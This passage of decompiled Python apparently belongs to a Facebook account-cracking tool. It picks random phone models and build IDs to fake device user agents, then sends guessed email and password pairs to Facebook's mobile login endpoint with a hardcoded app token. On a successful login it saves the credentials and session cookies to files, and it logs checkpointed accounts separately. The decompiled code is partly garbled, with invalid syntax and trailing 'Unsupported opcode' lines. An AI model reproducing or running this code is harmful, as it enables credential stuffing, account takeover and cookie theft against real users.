            'Black Shark 4 Pro',
            'Black Shark 5',
            'Black Shark 5 Pro',
            'Black Shark Helo',
            'Civi',
            'Civi 2',
            'Hongmi',
            'Hongmi 1S',
            'Hongmi 2',
            'Hongmi 2 3G',
            'Hongmi 2 4G',
            'Hongmi 4G',
            'Hongmi Note 1TD',
            'Mi Box 4',
            'Mi Cancro',
            'Mi CC 9',
            'Mi CC 9 Pro',
            'Mi CC 9e',
            'Mi CC9',
            'Mi Laser Projector 150',
            'Mi Max',
            'Mi Max 2',
            'Mi Max 3',
            'Mi MAX2',
            'Mi Max3',
            'Mi Mix',
            'Mi Mix 2',
            'Mi Mix 2S',
            'Mi Mix 3',
            'Mi Mix 3 5G',
            'Mi Mix 4',
            'Mi Mix Fold',
            'Mi Note 10',
            'Mi Note 10 Lite',
            'Mi Note 10 Pro',
            'Mi Note 11',
            'Mi Note 2',
            'Mi Note 3',
            'Mi Note 8',
            'Mi Note LTE',
            'Mi Note Pro',
            'Mi Note10',
            'Mi Note5',
            'Mi One',
            'Mi One C1',
            'Mi One Plus',
            'Mi Pad',
            'Mi Pad 2',
            'Mi Pad 3',
            'Mi Pad 4',
            'Mi Pad 4 Plus',
            'Mi Pad 5',
            'Mi Pad 5 Pro',
            'Mi Pad 5 Pro 5G',
            'Mi Pad4',
            'Mi Pad5',
            'Mi Play',
            'Mi XL',
            'Mi5',
            'MiTV 4A',
            'MiTV 4A Pro',
            'MiTV 4C',
            'MiTV 4I',
            'MiTV 4S',
            'MiTV 4X',
            'MiTV P1',
            'MiTV Q1',
            'MiTV Stick',
            'MiTV Stick 4K',
            'Mix Fold 2',
            'MT6765 G Series',
            'Note 12 Pro',
            'Pad 6 Pro',
            'Pocophone F1',
            'Qin 1s+',
            'Qin 2',
            'Qin 2 Pro',
            'Redmi 11',
            'Redmi 12',
            'Redmi 2',
            'Redmi 3',
            'Redmi 4',
            'Redmi 5',
            'Redmi 6',
            'Redmi 7',
            'Redmi 8',
            'Redmi 9',
            'Redmi A1',
            'Redmi A2',
            'Redmi A3',
            'Redmi K30',
            'Redmi K40',
            'Redmi K50',
            'Redmi K60',
            'Redmi note',
            'Redmi Note 1',
            'Redmi Note 10Redmi Note 11',
            'Redmi Note 12',
            'Redmi Note 12T',
            'Redmi Note 13',
            'Redmi Note 15 Pro',
            'Redmi Note 2',
            'Redmi Note 3',
            'Redmi Note 4',
            'Redmi Note 5',
            'Redmi Note 5 Pro',
            'Redmi Note 6',
            'Redmi Note 7',
            'Redmi Note 7 Pro',
            'Redmi Note 8 Pro',
            'Redmi Note 8T',
            'Redmi Note 9',
            'Redmi Note 9 5G',
            'Redmi Note 9 Pro',
            'Redmi Note 9 Pro 5G',
            'Redmi Note 9 Pro Max',
            'Redmi Note 9S',
            'Redmi Note 9T',
            'Redmi Note 9T 5G',
            'Redmi Note Prime',
            'Redmi Note10',
            'Redmi Note10T',
            'Redmi Note7',
            'Redmi Note8',
            'Redmi Note8T',
            'Redmi Note9',
            'Redmi Pad',
            'Redmi Pro',
            'Redmi S2',
            'Redmi X',
            'Redmi Y1',
            'Redmi Y1 Lite',
            'Redmi Y2',
            'Redmi Y3',
            'Redmi 2',
            'Redmi 3',
            'Redmi 3S',
            'Redmi 4',
            'Redmi 4A',
            'Redmi 4X',
            'Redmi 5',
            'Redmi 5 Plus',
            'Redmi 5A',
            'Redmi 6',
            'Redmi Note',
            'Redmi Note 3',
            'Redmi Note 4',
            'Redmi Note 4X',
            'Redmi Note 5',
            'Redmi Note 5 Pro',
            'Redmi Note 5A',
            'Redmi Note 5A Prime',
            'Redmi S2',
            'Redmi Y1',
            'Redmi Y1 Lite',
            'Redmi Y2',
            'Rex 60',
            'Rex 80',
            'Rhyme',
            'RM-560',
            'Ruby'])
        mmm = random.choice([
            'Ruby',
            'V10 (AT&T)',
            'V10 (T-Mobile)',
            'V10 (Verizon)',
            'V1Max',
            'V20',
            'V20 (AT&T)',
            'V20 (Sprint)',
            'V20 (T-Mobile)',
            'V20 (Verizon)',
            'V3',
            'V5',
            'V5s',
            'V7',
            'V7 Plus',
            'V808',
            'V9',
            'Valencia',
            'Vdeo 2',
            'Vega Iron 2 WiFi',
            'Vibe K5',
            'Vibe K5 Note',
            'Vibe K5 Plus Dual SIM',
            'Vibe X',
            'Vibe Z',
            'Vision',
            'Vision 3 Dual SIM',
            'Volt LS740',
            'VR Bot 552',
            'VX5500',
            'Y21',
            'Y21L',
            'Y28',
            'Y3 (2018)',
            'Y336-U02',
            'Y5 Dual SIM (2017)',
            'Y5 II',
            'Y5 Prime 2018 Dual SIM',
            'Y51',
            'Y51L',
            'Y55L',
            'Y6 (2018)',
            'Y6 Dual SIM (2018)',
            'Y6 Prime (2018)',
            'Y65',
            'Y66',
            'Y69',
            'Y71',
            'Y81',
            'Y83',
            'Yota Phone 2',
            'YP-GI1'])
        bbbb = random.choice([
            'PQ3B.190801.002',
            'PQ1A.181205.002.A1',
            'G950FXXU4DSBA',
            'G950FXXS5DSF1',
            'G950FXXS8DTC6',
            'G998USQU1ATCU',
            'G985FXXU7DTJ2',
            'N986BXXU1BTJ4',
            'A525FXXU3AUG4',
            'T970XXU3BUI7',
            'F916BXXU1BTKF',
            'N970FXXS8ETK4',
            'G975USQU4ETG1',
            'A715FXXU3ATI8',
            'T500XXU3BUA8',
            'OPM6.171019.030.K1',
            'OPM2.171026.006.C1',
            'TQ1A.230105.001.A3',
            'SQ1A.211205.008',
            'SD1A.210817.037.A1',
            'RP1A.201005.004.A1',
            'PQ1A.181205.006',
            'N9F27L',
            'PPR1.180610.011',
            'PPR2.180905.006',
            'QP1A.191105.003',
            'RD1A.201105.003.C1',
            'MMB29U',
            'NDE63H',
            'N4F26J',
            'NMF27D',
            'N4F26X',
            'KOT49H',
            'JWR66L',
            'LMY48G',
            'LMY48J',
            'MDB08M',
            'HLK75H',
            'HLK75F',
            'HRI83',
            'HLK75C',
            'EPE54B',
            'G950FXXU3CRGH',
            'G950FXXS6DTA1'])
        mmmmm = random.choice([
            'Optimus Vu',
            'OT-7025D',
            'P10 Lite LTE',
            'P2',
            'P20 Lite',
            'P30 Pro (Global)',
            'P3400',
            'P55 Max',
            'P7 Max',
            'P8 Lite',
            'P9 Lite',
            'Pacific 800i',
            'Pearl 8100',
            'Phoenix 2',
            'Phone',
            'Pixel',
            'Pixel 3',
            'Pixel XL',
            'Pixi',
            'Prada 3.0',
            'Pre3',
            'Primo GH7',
            'Quad EVO Energy 5',
            'Quantum 4',
            'Radar 4G',
            'Radar C110e',
            'Realme 2',
            'Red Rice',
            'Redmi 2',
            'Redmi 3',
            'Redmi 4',
            'Redmi 5',
            'Redmi 5 Plus',
            'Redmi 5A',
            'Redmi 6',
            'Redmi Note 3',
            'Redmi Note 4',
            'Redmi Note 5',
            'Redmi S2',
            'Redmi Y1',
            'Redmi Y2',
            'Rex 60',
            'Rex 80',
            'Rhyme',
            'RM-560',
            'Ruby',
            'S4502M',
            'S4505M',
            'S4702M',
            'S580',
            'S616',
            'S660',
            'Sensation',
            'SGH-E250',
            'SGH-I547',
            'SM-G485F',
            'Spark',
            'Star 3 Duos',
            'Storm 9530',
            'Stream',
            'Stylo 2 Plus (T-Mobile)',
            'Stylus 2',
            'TM-4377',
            'Torch 4G 9810'])
        mmmm = random.choice([
            'Optimus Vu',
            'OT-7025D',
            'P10 Lite LTE',
            'P2',
            'P20 Lite',
            'P30 Pro (Global)',
            'P3400',
            'P55 Max',
            'P7 Max',
            'P8 Lite',
            'P9 Lite',
            'Pacific 800i',
            'Pearl 8100',
            'Phoenix 2',
            'Phone',
            'Pixel',
            'Pixel 3',
            'Pixel XL',
            'Pixi',
            'Prada 3.0',
            'Pre3',
            'Primo GH7',
            'Quad EVO Energy 5',
            'Quantum 4',
            'Radar 4G',
            'Radar C110e',
            'Realme 2',
            'Red Rice',
            'Redmi 2',
            'Redmi 3',
            'Redmi 4',
            'Redmi 5',
            'Redmi 5 Plus',
            'Redmi 5A',
            'Redmi 6',
            'Redmi Note 3',
            'Redmi Note 4',
            'Redmi Note 5',
            'Redmi S2',
            'Redmi Y1',
            'Redmi Y2',
            'Rex 60',
            'Rex 80',
            'Rhyme',
            'RM-560',
            'Ruby',
            'S4502M',
            'S4505M',
            'S4702M',
            'S580',
            'S616',
            'S660',
            'Sensation',
            'SGH-E250',
            'SGH-I547',
            'SM-G485F',
            'Spark',
            'Star 3 Duos',
            'Storm 9530',
            'Stream',
            'Stylo 2 Plus (T-Mobile)',
            'Stylus 2',
            'TM-4377',
            'Torch 4G 9810'])
        cph = random.choice([
            'CPH1979',
            'CPH1983',
            'CPH1987',
            'CPH2005',
            'CPH2009',
            'CPH2015',
            'CPH2059',
            'CPH2061',
            'CPH2065',
            'CPH2069',
            'CPH2071',
            'CPH2073',
            'CPH2077',
            'CPH2091',
            'CPH2095',
            'CPH2099',
            'CPH2137',
            'CPH2139',
            'CPH2145',
            'CPH2161',
            'CPH2185',
            'CPH2201',
            'CPH2209',
            'CPH1801',
            'CPH1803',
            'CPH1805',
            'CPH1809',
            'CPH1827',
            'CPH1837',
            'CPH1851',
            'CPH1853'])
        network = random.choice([
            'Zong',
            'null',
            'Marshmallow',
            'Telekom China'])
        ua = '[FBAN/FB4A;FBAV/' + str(random.randint(11, 77)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(11, 77)) + ';FBBV/' + str(random.randint(1111111, 7777777)) + ';FBBV/2282831;FBDM/{density=3.4,width=1391,height=1609};FBLC/en_US;FBRV/774005469;FBCR/Mobilink;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.mlite;FBDV/Samsung;FBSV/17;FBOP/5;FBCA/x86:armeabi-v7a;]'
        random_seed = random.Random()
        adid = str(''.join(random_seed.choices(string.hexdigits, k = 16)))
        device_id = str(uuid.uuid4())
        secure = str(uuid.uuid4())
        family = str(uuid.uuid4())
        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        xd = str(''.join(random_seed.choices(string.digits, k = 20)))
        sm = [
            'GT-',
            'SM-']
        sim_serials = f'''["{xd}"]'''
        li = [
            '28',
            '29',
            '210']
        li2 = random.choice(li)
        j1 = (lambda .0: for _ in .0:
random.choice(digits)None)(range(2)())
        jazoest = li2 + j1
        data = {
            'adid': adid,
            'format': 'json',
            'device_id': device_id,
            'email': ids,
            'password': pas,
            'generate_analytics_claims': '1',
            'credentials_type': 'password',
            'source': 'login',
            'error_detail_type': 'button_with_disabled',
            'enroll_misauth': 'false',
            'generate_session_cookies': '1',
            'generate_machine_id': '1',
            'locale': 'fa_AF',
            'client_country_code': 'AF',
            'fb_api_req_friendly_name': 'authenticate' }
        headers = {
            'User-Agent': PIK_UA(),
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'Connection': 'keep-alive',
            'Authorization': f'''OAuth {accessToken}''',
            'X-FB-Friendly-Name': 'authenticate',
            'X-FB-Connection-Type': 'unknown',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-HTTP-Engine': 'Liger' }
        url = 'https://b-graph.facebook.com/auth/login'
        twf = 'Login approvals are on. Expect an SMS shortly with a code to use for log in'
        po = requests.post(url, data = data, headers = headers).json()
        if 'session_key' in po:
            uid = po['uid']
            ''.join
            uid = ids
            if str(uid) in oks:
                pass
            print('\r\r\x1b[1;32m [PIK-OK] ' + str(uid) + ' | ' + pas + '\x1b[1;97m')
            coki = (lambda .0: for i in .0:
i['name'] + '=' + i['value']None)(po['session_cookies']())
            print('\r\r\x1b[1;33m Cookie: ' + coki)
            open('/sdcard/PIK-COKIE.txt', 'a').write(str(uid) + '|' + pas + ' | ' + coki + '\n')
            open('/sdcard/PIK-OK.txt', 'a').write(str(uid) + '|' + pas + '\n')
            oks.append(str(uid))
            ';'.join
        if 'www.facebook.com' in po['error']['message']:
            uid = po['error']['error_data']['uid']
            uid = ids
            if uid in oks:
                pass
            open('/sdcard/PIK-rnd-CP.txt', 'a').write(str(uid) + '|' + pas + '\n')
            cps.append(str(ids))
        loop += 1
        return None
        if Exception:
            e = None
            e = None
            del e
            return None
        e = None
        del e

menu()

Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: CHECK_EXC_MATCH
Unsupported opcode: RERAISE
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: CHECK_EXC_MATCH
Unsupported opcode: RERAISE
Unsupported opcode: RERAISE
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: CHECK_EXC_MATCH
Unsupported opcode: RERAISE
Unsupported opcode: RERAISE
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: CHECK_EXC_MATCH
Unsupported opcode: RERAISE
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: BEFORE_WITH
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: WITH_EXCEPT_START
Unsupported opcode: RERAISE
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: CHECK_EXC_MATCH
Unsupported opcode: COPY
Unsupported opcode: RERAISE
